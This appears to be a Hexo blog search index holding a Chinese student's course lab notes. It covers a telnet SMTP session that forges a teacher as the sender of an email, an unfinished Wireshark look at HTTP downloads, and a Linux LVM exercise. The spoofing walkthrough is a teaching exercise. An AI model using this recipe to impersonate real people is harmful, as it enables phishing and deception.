<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[一些有趣的实验]]></title>
      <url>/2019/10/03/linux%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%AE%9E%E9%AA%8C/</url>
      <content type="html"><![CDATA[<p>课上老师布置的一些实验的记录.</p>
<a id="more"></a>
<h1 id="实验合集"><a href="#实验合集" class="headerlink" title="实验合集"></a>实验合集</h1><h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h2><h3 id="smtp-发送伪造邮件"><a href="#smtp-发送伪造邮件" class="headerlink" title="smtp 发送伪造邮件"></a>smtp 发送伪造邮件</h3><p>计网老师布置的一个小任务 : 伪装<code>ligang</code>老师给他发个邮件. </p>
<p>通过telnet与smtp服务器进行命令行交互, 手工编写邮件内容, 就可以设置虚假的发件人信息.</p>
<p>以下演示在<code>Windows10 cmd</code>中.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt; telnet</span><br><span class="line">&gt; o smtp.qq.com 587</span><br><span class="line">220 smtp.qq.com Esmtp QQ Mail Server </span><br><span class="line">&gt; helo smtp</span><br><span class="line">250 smtp.qq.com                    </span><br><span class="line">&gt; starttls  </span><br><span class="line">220 Ready to start TLS             </span><br><span class="line">&gt; auth login                       </span><br><span class="line">334 VXNlcm5hbWU6   </span><br><span class="line">&gt; MTM0ODY1MTU4MEBxcS5jb20=  <span class="comment"># qq邮箱的base64编码</span></span><br><span class="line">334 UGFzc3dvcmQ6                  </span><br><span class="line">&gt; ***************   <span class="comment"># qq邮箱授权码的base64编码              </span></span><br><span class="line">235 Authentication successful     </span><br><span class="line">&gt; mail from:&lt;1348651580@qq.com&gt;            </span><br><span class="line">250 Ok       </span><br><span class="line">&gt; rcpt to:&lt;3018******@tju.edu.cn&gt;          </span><br><span class="line">250 Ok       </span><br><span class="line">&gt; data </span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;      </span><br><span class="line">&gt; from:ligang@tju.edu.cn            </span><br><span class="line">&gt; to:&lt;3018******@tju.edu.cn&gt;</span><br><span class="line">&gt; subject:i want to play a game    </span><br><span class="line">&gt; </span><br><span class="line">&gt; we will we will rockyou.</span><br><span class="line">&gt; .</span><br><span class="line">250 Ok: queued as</span><br></pre></td></tr></table></figure>

<p>按照上面的输入成功后, 会有如下的效果.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/smtp.png" alt title class>
                <p></p>
            </figure>

<p>可以发现, 发件人成功的显示成了<code>ligang</code>.</p>
<p>不过细心的你(口区)应该已经发现了, 最后竟然显示了我真实的邮箱 ! ! !</p>
<p>要想去掉这个代发的字段也有办法, 那就是需要搭建自己的smtp服务器.( 正在尝试中 … )</p>
<p>不过这种欺骗手段似乎只要查看了邮件头就没有任何效果了, 只能拿去吓唬吓唬其它专业的同学们, 哈哈哈.</p>
<h3 id="http-下的文件下载分析"><a href="#http-下的文件下载分析" class="headerlink" title="http 下的文件下载分析"></a>http 下的文件下载分析</h3><ul>
<li>实验目的 : <ul>
<li>抓包分析 http 下载文件的细节</li>
<li>思考迅雷下载实现加速, 断点续传等功能的原理</li>
</ul>
</li>
</ul>
<h4 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h4><p>为了便于控制和能省流量, 我用 Apache 在本地(Windows)启动一个web服务器, 并将一个约 74MB 的文件放置于网站根目录下供我模拟下载.</p>
<p>然后使用<code>wireshark</code>捕获<code>Npcap Loopback Adapter</code>的数据包. 很快我就找到了下载文件的<code>http.GET请求包</code></p>
<p>但是当我追踪这个http流的时候, 发现竟然只有一个http数据包. </p>
<p><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/stream2.png" alt></p>
<p>于是我尝试追踪了下其他的tcp数据包, 根据数据包的目的端口号(可以根据刚才的Get请求得到)和数据包的大小(下载文件的响应包应该会较大). 最终追踪到了正确的tcp流. </p>
<p><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/stream3.png" alt></p>
<p>第一行的状态行<code>HTTP/1.1 200 OK</code>, 可以判断出数据应该也是使用http协议传输到客户端, 但是<code>wireshark</code>为啥不能追踪 http流 还不是很清楚.</p>
<p>从 <code>RESPONSE</code> 包的 <code>HEAD</code> 中, 有 <code>Content-Length: 76559956</code> 这么一项. 因为 76559956 / (1000 * 1000) = 76.5, 而我下载的文件大小是 74MB , 也就是这个参数的单位是 byte.</p>
<p>然而在</p>
<p>(未完待续)</p>
<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="linux-文件管理系统实验记录"><a href="#linux-文件管理系统实验记录" class="headerlink" title="linux 文件管理系统实验记录"></a>linux 文件管理系统实验记录</h3><ul>
<li>环境 : Ubuntu 16.04 (VMware Workstation 15 pro)</li>
<li>实验目标 : 使用命令行管理文件系统</li>
</ul>
<h4 id="分配虚拟硬盘"><a href="#分配虚拟硬盘" class="headerlink" title="分配虚拟硬盘"></a>分配虚拟硬盘</h4><p>虚拟机关闭时, 在VMware的<code>编辑虚拟机设置</code>里添加两个新的硬盘, 各10G.</p>
<p>完成后可以打开虚拟机确认:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~$ sudo fdisk -l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sdb: 10 GiB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sdc: 10 GiB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br></pre></td></tr></table></figure>

<h4 id="创建和扩大文件系统和相关逻辑卷管理"><a href="#创建和扩大文件系统和相关逻辑卷管理" class="headerlink" title="创建和扩大文件系统和相关逻辑卷管理"></a>创建和扩大文件系统和相关逻辑卷管理</h4><h5 id="使用fdisk将sdb分出分区"><a href="#使用fdisk将sdb分出分区" class="headerlink" title="使用fdisk将sdb分出分区"></a>使用fdisk将sdb分出分区</h5><ul>
<li>sdb1:主分区, 4G  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo fdisk /dev/sdb</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.27.1).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, until you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">Device does not contain a recognized partition table.</span><br><span class="line">Created a new DOS disklabel with disk identifier 0x7ae8300a.</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">Partition <span class="built_in">type</span></span><br><span class="line">p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">e   extended (container <span class="keyword">for</span> logical partitions)</span><br><span class="line">Select (default p): p</span><br><span class="line">分区号 (1-4, default 1): </span><br><span class="line">First sector (2048-20971519, default 2048): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (2048-20971519, default 20971519): +4G</span><br><span class="line"></span><br><span class="line">Created a new partition 1 of <span class="built_in">type</span> <span class="string">'Linux'</span> and of size 4 GiB.</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>sdb2: 扩展分区, 6G.  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">Partition <span class="built_in">type</span></span><br><span class="line">p   primary (1 primary, 0 extended, 3 free)</span><br><span class="line">e   extended (container <span class="keyword">for</span> logical partitions)</span><br><span class="line">Select (default p): e</span><br><span class="line">分区号 (2-4, default 2): </span><br><span class="line">First sector (8390656-20971519, default 8390656): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (8390656-20971519, default 20971519): </span><br><span class="line"></span><br><span class="line">Created a new partition 2 of <span class="built_in">type</span> <span class="string">'Extended'</span> and of size 6 GiB.</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>sdb5, sdb6逻辑分区, 各3G  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">All space <span class="keyword">for</span> primary partitions is <span class="keyword">in</span> use.</span><br><span class="line">Adding logical partition 5</span><br><span class="line">First sector (8392704-20971519, default 8392704): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (8392704-20971519, default 20971519): +3G</span><br><span class="line"></span><br><span class="line">Created a new partition 5 of <span class="built_in">type</span> <span class="string">'Linux'</span> and of size 3 GiB.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">All space <span class="keyword">for</span> primary partitions is <span class="keyword">in</span> use.</span><br><span class="line">Adding logical partition 6</span><br><span class="line">First sector (14686208-20971519, default 14686208): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (14686208-20971519, default 20971519): +3G</span><br><span class="line"></span><br><span class="line">Created a new partition 6 of <span class="built_in">type</span> <span class="string">'Linux'</span> and of size 3 GiB.</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： w</span><br><span class="line"></span><br><span class="line">The partition table has been altered.</span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">Syncing disks.</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="将sdb6-和-sdc-初始化为物理卷-PV"><a href="#将sdb6-和-sdc-初始化为物理卷-PV" class="headerlink" title="将sdb6 和 sdc 初始化为物理卷(PV)"></a>将sdb6 和 sdc 初始化为物理卷(PV)</h5><p>这里有个小插曲, 我的机器中 pvcreate 工具没有安装.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo pvcreate /dev/sdb6</span><br><span class="line">sudo: pvcreate：找不到命令</span><br><span class="line"><span class="comment"># 安装 lvm2 即可</span></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo apt-get install lvm2</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo pvcreate /dev/sdb6</span><br><span class="line">  Physical volume <span class="string">"/dev/sdb6"</span> successfully created.</span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo pvcreate /dev/sdc</span><br><span class="line">  Physical volume <span class="string">"/dev/sdc"</span> successfully createdyjn</span><br><span class="line">  </span><br><span class="line">@yjn-virtual-machine:/dev$ sudo pvs</span><br><span class="line">PV         VG Fmt  Attr PSize  PFree </span><br><span class="line">/dev/sdb6     lvm2 ---  &lt;3.00g &lt;3.00g</span><br><span class="line">/dev/sdc      lvm2 ---  10.00g 10.00g</span><br></pre></td></tr></table></figure>

<h5 id="将-sdb6-和-sdc-加入卷组-VG-vg00-中"><a href="#将-sdb6-和-sdc-加入卷组-VG-vg00-中" class="headerlink" title="将 sdb6 和 sdc 加入卷组(VG) vg00 中"></a>将 sdb6 和 sdc 加入卷组(VG) vg00 中</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgcreate vg00 /dev/sdb6</span><br><span class="line">  Volume group <span class="string">"vg00"</span> successfully created</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgex vg00 </span><br><span class="line">vgexport  vgextend  </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgextend vg00 /dev/sdc </span><br><span class="line">  Volume group <span class="string">"vg00"</span> successfully extended</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgs</span><br><span class="line">  VG   <span class="comment">#PV #LV #SN Attr   VSize  VFree </span></span><br><span class="line">  vg00   2   0   0 wz--n- 12.99g 12.99g</span><br></pre></td></tr></table></figure>

<h5 id="在vg00-中创建逻辑卷-LV-lv00-初始大小为-10G"><a href="#在vg00-中创建逻辑卷-LV-lv00-初始大小为-10G" class="headerlink" title="在vg00 中创建逻辑卷(LV)lv00, 初始大小为 10G"></a>在vg00 中创建逻辑卷(LV)lv00, 初始大小为 10G</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgs</span><br><span class="line">  VG   <span class="comment">#PV #LV #SN Attr   VSize  VFree </span></span><br><span class="line">  vg00   2   0   0 wz--n- 12.99g 12.99g</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo lvcreate -L 10G -n lv00 /dev/vg00</span><br><span class="line">  Logical volume <span class="string">"lv00"</span> created.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo lvs</span><br><span class="line">  LV   VG   Attr       LSize  Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class="line">  lv00 vg00 -wi<span class="_">-a</span>----- 10.00g</span><br></pre></td></tr></table></figure>

<h5 id="在lv00-中创建文件系统并装载"><a href="#在lv00-中创建文件系统并装载" class="headerlink" title="在lv00 中创建文件系统并装载"></a>在lv00 中创建文件系统并装载</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo mkfs.ext4 /dev/vg00/lv00</span><br><span class="line">mke2fs 1.42.13 (17-May-2015)</span><br><span class="line">Creating filesystem with 2621440 4k blocks and 655360 inodes</span><br><span class="line">Filesystem UUID: 0cb50d90-490e-4413-b702-1187b48d10fc</span><br><span class="line">Superblock backups stored on blocks: </span><br><span class="line">	32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632</span><br><span class="line"></span><br><span class="line">Allocating group tables: 完成                            </span><br><span class="line">正在写入inode表: 完成                            </span><br><span class="line">Creating journal (32768 blocks): 完成</span><br><span class="line">Writing superblocks and filesystem accounting information: 完成 </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS$ sudo mkdir data</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS$ sudo mount /dev/vg00/lv00 data</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls</span><br><span class="line">lost+found</span><br></pre></td></tr></table></figure>

<p>我将文件系统挂在了 <code>OS/data/</code> 这个文件夹中.</p>
<h5 id="在文件系统中创建一个-8G-的大文件"><a href="#在文件系统中创建一个-8G-的大文件" class="headerlink" title="在文件系统中创建一个 8G 的大文件"></a>在文件系统中创建一个 8G 的大文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo dd <span class="keyword">if</span>=/dev/zero of=/home/yjn/OS/data/bigfile1 bs=1M count=8192</span><br><span class="line">记录了8192+0 的读入</span><br><span class="line">记录了8192+0 的写出</span><br><span class="line">8589934592 bytes (8.6 GB, 8.0 GiB) copied, 12.1378 s, 708 MB/s</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls -lh</span><br><span class="line">总用量 8.1G</span><br><span class="line">-rw-r--r-- 1 root root 8.0G 10月  3 18:29 bigfile1</span><br><span class="line">drwx------ 2 root root  16K 10月  3 18:24 lost+found</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ df -h</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">udev                   1.5G     0  1.5G    0% /dev</span><br><span class="line">tmpfs                  300M  8.9M  291M    3% /run</span><br><span class="line">/dev/sda1               17G  4.6G   12G   30% /</span><br><span class="line">tmpfs                  1.5G  132K  1.5G    1% /dev/shm</span><br><span class="line">tmpfs                  5.0M  4.0K  5.0M    1% /run/lock</span><br><span class="line">tmpfs                  1.5G     0  1.5G    0% /sys/fs/cgroup</span><br><span class="line">tmpfs                  300M   40K  300M    1% /run/user/1000</span><br><span class="line">/dev/mapper/vg00-lv00  9.8G  8.1G  1.2G   88% /home/yjn/OS/data</span><br></pre></td></tr></table></figure>

<h5 id="扩大lv-逻辑卷-和fs-文件系统"><a href="#扩大lv-逻辑卷-和fs-文件系统" class="headerlink" title="扩大lv(逻辑卷)和fs(文件系统)"></a>扩大lv(逻辑卷)和fs(文件系统)</h5><p>假如现在又要一个大文件bigfile2, 大小为3G, 文件系统不够大了, 需要扩大lv 和 fs.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo lvextend -L 12G /dev/vg00/lv00</span><br><span class="line">  Size of logical volume vg00/lv00 changed from 10.00 GiB (2560 extents) to 12.00 GiB (3072 extents).</span><br><span class="line">  Logical volume vg00/lv00 successfully resized.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo resize2fs /dev/vg00/lv00</span><br><span class="line">resize2fs 1.42.13 (17-May-2015)</span><br><span class="line">Filesystem at /dev/vg00/lv00 is mounted on /home/yjn/OS/data; on-line resizing required</span><br><span class="line">old_desc_blocks = 1, new_desc_blocks = 1</span><br><span class="line">The filesystem on /dev/vg00/lv00 is now 3145728 (4k) blocks long.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ df -h</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">udev                   1.5G     0  1.5G    0% /dev</span><br><span class="line">tmpfs                  300M  8.9M  291M    3% /run</span><br><span class="line">/dev/sda1               17G  4.6G   12G   30% /</span><br><span class="line">tmpfs                  1.5G  132K  1.5G    1% /dev/shm</span><br><span class="line">tmpfs                  5.0M  4.0K  5.0M    1% /run/lock</span><br><span class="line">tmpfs                  1.5G     0  1.5G    0% /sys/fs/cgroup</span><br><span class="line">tmpfs                  300M   40K  300M    1% /run/user/1000</span><br><span class="line">/dev/mapper/vg00-lv00   12G  8.1G  3.1G   73% /home/yjn/OS/data</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo dd <span class="keyword">if</span>=/dev/zero of=bigfile2 bs=1M count=3096</span><br><span class="line">记录了3096+0 的读入</span><br><span class="line">记录了3096+0 的写出</span><br><span class="line">3246391296 bytes (3.2 GB, 3.0 GiB) copied, 1.92041 s, 1.7 GB/s</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls -lh</span><br><span class="line">总用量 12G</span><br><span class="line">-rw-r--r-- 1 root root 8.0G 10月  3 18:29 bigfile1</span><br><span class="line">-rw-r--r-- 1 root root 3.1G 10月  3 18:34 bigfile2</span><br><span class="line">drwx------ 2 root root  16K 10月  3 18:24 lost+found</span><br></pre></td></tr></table></figure>

<h5 id="扩大pv-物理卷"><a href="#扩大pv-物理卷" class="headerlink" title="扩大pv(物理卷)"></a>扩大pv(物理卷)</h5><p>假如又要在放一个文件bigfile3, 大小为3G, 那么, pv中的剩余空间也不够了. 需要先扩pv, 再扩lv 和 fs.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo pvcreate /dev/sdb5</span><br><span class="line">  Physical volume <span class="string">"/dev/sdb5"</span> successfully created.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo vgextend vg00 /dev/sdb5</span><br><span class="line">  Volume group <span class="string">"vg00"</span> successfully extended</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo vgs</span><br><span class="line">  VG   <span class="comment">#PV #LV #SN Attr   VSize   VFree </span></span><br><span class="line">  vg00   3   1   0 wz--n- &lt;15.99g &lt;3.99g</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo lvextend -L 15.5G /dev/vg00/lv00</span><br><span class="line">  Size of logical volume vg00/lv00 changed from 12.00 GiB (3072 extents) to 15.50 GiB (3968 extents).</span><br><span class="line">  Logical volume vg00/lv00 successfully resized.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo resize2fs /dev/vg00/lv00</span><br><span class="line">resize2fs 1.42.13 (17-May-2015)</span><br><span class="line">Filesystem at /dev/vg00/lv00 is mounted on /home/yjn/OS/data; on-line resizing required</span><br><span class="line">old_desc_blocks = 1, new_desc_blocks = 1</span><br><span class="line">The filesystem on /dev/vg00/lv00 is now 4063232 (4k) blocks long.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ df -h</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">udev                   1.5G     0  1.5G    0% /dev</span><br><span class="line">tmpfs                  300M  8.9M  291M    3% /run</span><br><span class="line">/dev/sda1               17G  4.6G   12G   30% /</span><br><span class="line">tmpfs                  1.5G  132K  1.5G    1% /dev/shm</span><br><span class="line">tmpfs                  5.0M  4.0K  5.0M    1% /run/lock</span><br><span class="line">tmpfs                  1.5G     0  1.5G    0% /sys/fs/cgroup</span><br><span class="line">tmpfs                  300M   40K  300M    1% /run/user/1000</span><br><span class="line">/dev/mapper/vg00-lv00   16G   12G  3.4G   77% /home/yjn/OS/data</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo dd <span class="keyword">if</span>=/dev/zero of=/home/yjn/OS/data/bigfile3 bs=1M count=3096</span><br><span class="line">记录了3096+0 的读入</span><br><span class="line">记录了3096+0 的写出</span><br><span class="line">3246391296 bytes (3.2 GB, 3.0 GiB) copied, 2.03317 s, 1.6 GB/s</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls -lh</span><br><span class="line">总用量 15G</span><br><span class="line">-rw-r--r-- 1 root root 8.0G 10月  3 18:29 bigfile1</span><br><span class="line">-rw-r--r-- 1 root root 3.1G 10月  3 18:34 bigfile2</span><br><span class="line">-rw-r--r-- 1 root root 3.1G 10月  3 18:42 bigfile3</span><br><span class="line">drwx------ 2 root root  16K 10月  3 18:24 lost+found</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ df -h ../data/</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">/dev/mapper/vg00-lv00   16G   15G  313M   98% /home/yjn/OS/data</span><br></pre></td></tr></table></figure>

<h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p>我们使用了由 sdb5(3GB), sdb6(&lt;3GB), sdc(10GB) 组成的卷组 vg00, 大小为 &lt;16GB.</p>
<p>在其中创建了一个大小为15.5GB的逻辑卷lv00, 此逻辑卷中创建了大小为15.5GB大小的文件系统, 并存放了 bigfile1(8G), bigfile2(3G), bigfile3(3G) 共14G的数据的三个大文件. </p>
<p>经测试, 文件系统随时可以扩大.</p>
<h4 id="缩小文件系统和相关的逻辑卷管理"><a href="#缩小文件系统和相关的逻辑卷管理" class="headerlink" title="缩小文件系统和相关的逻辑卷管理"></a>缩小文件系统和相关的逻辑卷管理</h4><h5 id="删除文件-卸载文件系统"><a href="#删除文件-卸载文件系统" class="headerlink" title="删除文件, 卸载文件系统"></a>删除文件, 卸载文件系统</h5><p>删除bigfile2, bigfile3, unmount文件系统, 为缩小文件系统做准备.</p>
